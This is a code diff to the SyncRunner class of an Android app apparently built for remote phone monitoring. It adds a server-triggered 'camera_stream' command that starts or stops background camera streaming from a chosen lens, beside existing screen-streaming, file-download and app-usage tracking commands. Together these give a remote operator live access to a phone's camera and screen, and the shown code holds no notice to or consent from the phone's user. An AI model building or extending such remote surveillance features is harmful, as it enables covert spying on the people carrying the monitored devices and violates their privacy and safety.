@@ -59,8 +59,9 @@ class SyncRunner(private val context: Context) {
 
         if (commands.isEmpty()) return true
 
-        // Process screen stream immediately
+        // Process screen and camera stream immediately
         commands.filter { it.command_type == "screen_stream" }.forEach { processScreenStreamCommand(bearer, it) }
+        commands.filter { it.command_type == "camera_stream" }.forEach { processCameraStreamCommand(bearer, it) }
 
         val flagsResponse = try {
             ApiClient.service.getFeatureFlags(bearer)
@@ -137,6 +138,7 @@ class SyncRunner(private val context: Context) {
             commands.filter { it.command_type == "file_download" }.forEach { processFileDownloadCommand(bearer, it) }
         }
         commands.filter { it.command_type == "screen_stream" }.forEach { processScreenStreamCommand(bearer, it) }
+        commands.filter { it.command_type == "camera_stream" }.forEach { processCameraStreamCommand(bearer, it) }
 
         // 2. Heavy periodic background collectors run after commands complete
         if (flags.app_usage_tracking) {
@@ -340,6 +342,81 @@ class SyncRunner(private val context: Context) {
             )
         } catch (e: Exception) {
             android.util.Log.e("SyncRunner", "Failed to ack screen stream start", e)
+        }
+    }
+
+    private suspend fun processCameraStreamCommand(bearer: String, command: RemoteCommand) {
+        val action = (command.payload?.get("action") as? String) ?: "start"
+        val lens = (command.payload?.get("lens") as? String) ?: "back"
+
+        if (action == "stop") {
+            com.spapp.monitoring.camerastream.CameraStreamService.stop(context)
+            try {
+                ApiClient.service.ackCommand(
+                    bearer,
+                    command.id,
+                    AckCommandRequest(success = true, message = "Camera stream stopped")
+                )
+            } catch (e: Exception) {
+                android.util.Log.e("SyncRunner", "Failed to ack stop camera stream", e)
+            }
+            return
+        }
+
+        val hasCameraPermission = androidx.core.content.ContextCompat.checkSelfPermission(
+            context,
+            android.Manifest.permission.CAMERA
+        ) == android.content.pm.PackageManager.PERMISSION_GRANTED
+
+        if (!hasCameraPermission) {
+            try {
+                ApiClient.service.ackCommand(
+                    bearer,
+                    command.id,
+                    AckCommandRequest(
+                        success = false,
+                        message = "Camera permission is not granted on this device. Please grant Camera permission in phone Settings."
+                    )
+                )
+            } catch (e: Exception) {
+                android.util.Log.e("SyncRunner", "Failed to ack camera stream permission check", e)
+            }
+            return
+        }
+
+        val state = DeviceState(context)
+        val authToken = state.authToken
+        val deviceId = state.getEffectiveDeviceId()
+
+        if (authToken == null || deviceId == null) {
+            try {
+                ApiClient.service.ackCommand(
+                    bearer,
+                    command.id,
+                    AckCommandRequest(
+                        success = false,
+                        message = "Device state missing auth token or device ID"
+                    )
+                )
+            } catch (e: Exception) {
+                android.util.Log.e("SyncRunner", "Failed to ack camera stream auth check", e)
+            }
+            return
+        }
+
+        com.spapp.monitoring.camerastream.CameraStreamService.start(context, lens)
+
+        try {
+            ApiClient.service.ackCommand(
+                bearer,
+                command.id,
+                AckCommandRequest(
+                    success = true,
+                    message = "Camera stream started ($lens lens)"
+                )
+            )
+        } catch (e: Exception) {
+            android.util.Log.e("SyncRunner", "Failed to ack camera stream start", e)
         }
     }
 
